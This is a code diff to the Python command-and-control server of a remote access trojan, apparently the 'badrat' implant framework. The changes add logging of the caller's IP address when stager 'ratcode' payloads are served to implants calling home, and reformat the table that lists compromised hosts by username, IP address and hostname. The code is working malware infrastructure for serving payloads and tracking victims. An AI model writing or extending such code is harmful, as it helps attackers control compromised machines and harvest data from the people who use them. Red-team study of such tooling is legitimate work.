@@ -239,9 +239,9 @@ def default_page():
 
 # Allow rats to call home and request more ratcode of their own type
 # Or send ad-hoc (stager) ratcode from the server.
-def send_ratcode(ratID=None, ratType=None):
-    if(ratType): # Ad hoc ratcode send
-        pretty_print("[*] Sending ad-hoc " + colors(ratType) + " ratcode")
+def send_ratcode(ratID=None, ratType=None, ip_addr=None):
+    if(ratType and ip_addr): # Ad hoc ratcode send
+        pretty_print("[*] Sending ad-hoc " + colors(ratType) + " ratcode to " + ip_addr)
         try:
             fd = open(os.getcwd() + "/rats/badrat." + ratType, 'rb')
             ratcode = fd.read()
@@ -409,9 +409,10 @@ def serve_server(port=8080):
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
         # Check to see if we are serving ad-hoc ratcode -- GET version
+        ip_addr = request.environ['REMOTE_ADDR']
         if(str.startswith(path, rand_path + "/b.")):
             ratType = path.split(".")[1]
-            return(send_ratcode(ratType=ratType))
+            return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
         return(default_page())
@@ -419,18 +420,17 @@ def serve_server(port=8080):
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['POST'])
     def badrat_comms(path):
-
+        ip_addr = request.environ['REMOTE_ADDR']
         # Check to see if we are serving ad-hoc ratcode -- POST version
         if(str.startswith(path, rand_path + "/b.")):
             ratType = path.split(".")[1]
-            return(send_ratcode(ratType=ratType))
+            return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
 
         # We are dealing with normal rat comms
         # Parse POST parameters
         post_json = request.get_json(force=True)
         post_dict = dict(post_json)
         try:
-            ip_addr = request.environ['REMOTE_ADDR']
             ratID = str(post_dict['id'])
             ratType = str(post_dict['type'])
             username = str(post_dict['un'])
@@ -515,13 +515,13 @@ def get_stagers(lhost):
     pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    implant id \ttype\tcheck-in\tusername\tip address\thostname")
-    pretty_print("    ----------\t----\t--------\t--------\t----------\t--------")
+    pretty_print("\n    {:<10}\t{:<4}\t{:<8}\t{:<12}\t{:<15}\t{:<10}".format("implant id", "type", "check-in","username","ip address","hostname"))
+    pretty_print("    ----------\t----\t--------\t--------    \t----------     \t--------")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID]+" \t"+ip_addrs[ratID]+" \t"+hostnames[ratID])
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}\t{:<12}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
         else:
-            pretty_print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID]+" \t"+ip_addrs[ratID]+" \t"+hostnames[ratID])
+            pretty_print("    {:<10}\t{:<4}\t{:<8}\t{:<12}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
     pretty_print("")
 
 def remove_rat(ratID):
